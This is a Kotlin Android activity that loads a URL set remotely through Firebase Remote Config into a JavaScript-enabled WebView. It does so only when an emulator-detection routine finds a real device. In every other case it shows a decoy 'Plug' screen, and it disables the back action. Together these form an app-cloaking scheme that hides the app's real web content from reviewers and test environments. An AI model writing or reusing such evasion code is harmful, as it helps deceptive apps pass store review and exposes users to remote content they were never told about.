package growimgs.example.testwork

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.KeyEvent
import android.webkit.CookieManager
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import com.example.testwork.databinding.ActivityMainBinding
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import java.lang.Exception


class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val sharedPreference = SharedPreference(this)
        if (sharedPreference.getValueString("url") == null) {
            firebaseLoad()
        }
        else{
            val connectivity = InternetConnection(this)
            connectivity.observe(this, Observer { isConnected ->
                if (isConnected) {
                    val url = sharedPreference.getValueString("url")
                    openUrlOrTraining(url.toString())
                } else {
                    val intent = Intent(this, Plug::class.java)
                    finish()
                    startActivity(intent)
                }
            })
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun openUrlOrTraining(url: String){
        if (url != "" && !checkIsEmu()){
            binding.webView.getSettings().javaScriptEnabled = true
            binding.webView.loadUrl(url)
            val sharedPreference = SharedPreference(this)
            sharedPreference.saveStr("url", url)
            val webViewClient: WebViewClient = object : WebViewClient() {

                @Deprecated("Deprecated in Java")
                override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                    view.loadUrl(url)
                    return true
                }
                override fun onPageFinished(view: WebView, url: String) {
                    CookieManager.getInstance().flush()
                }

                override fun shouldOverrideUrlLoading(
                    view: WebView,
                    request: WebResourceRequest
                ): Boolean {
                    view.loadUrl(request.url.toString())
                    return true
                }
            }
            binding.webView.webViewClient = webViewClient
        }else{
            val intent = Intent(this, Plug::class.java)
            finish()
            startActivity(intent)
        }
    }

    fun firebaseLoad(){
        try {
            val defaults = mapOf(
                "url" to ""
            )
            val remoteConfig = FirebaseRemoteConfig.getInstance()
            val remoteConfigSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 0
            }
            remoteConfig.setConfigSettingsAsync(remoteConfigSettings)
            remoteConfig.setDefaultsAsync(defaults)

            remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val url =remoteConfig.getString("url")
                    openUrlOrTraining(url)
                }
            }.addOnFailureListener { error ->
                val intent = Intent(this, Plug::class.java)
                finish()
                startActivity(intent)
            }
        }catch (e: Exception){
            val intent = Intent(this, Plug::class.java)
            finish()
            startActivity(intent)
        }
    }

    private fun checkIsEmu(): Boolean {
        val isProbablyRunningOnEmulator: Boolean by lazy {
            return@lazy ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
                    ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                            && Build.FINGERPRINT.endsWith(":user/release-keys")
                            && Build.PRODUCT.startsWith("sdk_gphone_")
                            && Build.MODEL.startsWith("sdk_gphone_"))
                            || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                            && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                            && Build.PRODUCT.startsWith("sdk_gphone64_")
                            && Build.MODEL.startsWith("sdk_gphone64_"))))
                    || Build.FINGERPRINT.startsWith("generic")
                    || Build.FINGERPRINT.startsWith("unknown")
                    || Build.MODEL.contains("google_sdk")
                    || Build.MODEL.contains("Emulator")
                    || Build.MODEL.contains("Android SDK built for x86")
                    || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER,ignoreCase = true)
                    || Build.MANUFACTURER.contains("Genymotion")
                    || Build.HOST.startsWith("Build")
                    || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                    || Build.PRODUCT == "google_sdk")
        }
        return isProbablyRunningOnEmulator
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK && binding.webView.canGoBack()) {
            binding.webView.goBack()
            return true
        }
        else {
            return super.onKeyDown(keyCode, event);
        }
    }

    override fun onBackPressed() {
    }
}